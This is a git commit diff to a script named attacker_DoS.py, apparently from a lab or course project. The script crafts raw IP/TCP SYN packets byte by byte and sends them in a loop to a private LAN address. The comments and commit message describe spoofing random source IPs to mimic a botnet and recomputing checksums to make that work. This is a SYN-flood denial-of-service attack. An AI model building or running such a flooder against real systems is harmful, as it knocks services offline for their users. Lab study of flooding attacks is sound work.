8e801ea21f3a732a22be817167253a64672b9572
aref <armowl@utu.fi>
2023-06-21 14:16:20 +0300

    resolved some errors. now only need to find a way to calculate and replace checksum fields on the fly.

--- attacker_DoS.py
+++ attacker_DoS.py
@@ -16,18 +16,18 @@ while True:
 
 		ip_header  = b'\x45\x00\x00\x28'  # Version, IHL, Type of Service | Total Length
 		ip_header += b'\xab\xcd\x00\x00'  # Identification | Flags, Fragment Offset
-		ip_header += b'\x40\x06\xa6\xec'  # TTL, Protocol | Header Checksum
-		ip_header += tmp  # Source Address (random IP addresses representing a botnet)
-		ip_header += b'\xC0\xA8\x01\x67'  # Destination Address 192.168.1.113
+		ip_header += b'\x40\x06\xa3\x5b'  # TTL, Protocol | Header Checksum a35b
+		ip_header += b'\xC0\xA8\x02\x02'  # Source Address (random IP addresses representing a botnet)  for now for testing we only use our correct IP address instead of the IP pool. need to find a way to calculate checksum on the fly.
+		ip_header += b'\xC0\xA8\x01\x67'  # Destination Address 192.168.1.103
 
 		tcp_header  = b'\x30\x3B\x30\x3B' # Source Port | Destination Port
 		tcp_header += b'\x00\x00\x00\x00' # Sequence Number
 		tcp_header += b'\x00\x00\x00\x00' # Acknowledgement Number
 		tcp_header += b'\x50\x02\x71\x10' # Data Offset, Reserved, Flags | Window Size /SYN set to 1
-		tcp_header += b'\xe6\x32\x00\x00' # Checksum | Urgent Pointer
+		tcp_header += b'\x59\xa2\x00\x00' # Checksum 59a2 | Urgent Pointer
 
 		packet = ip_header + tcp_header
-		s.sendto(packet, ('192.168.1.103', 12347))
+		s.sendto(packet, ('192.168.1.103', 0))
 		number += 1
 		print(f'sent packet from {tmp} ' + str(number))
 	except Exception:
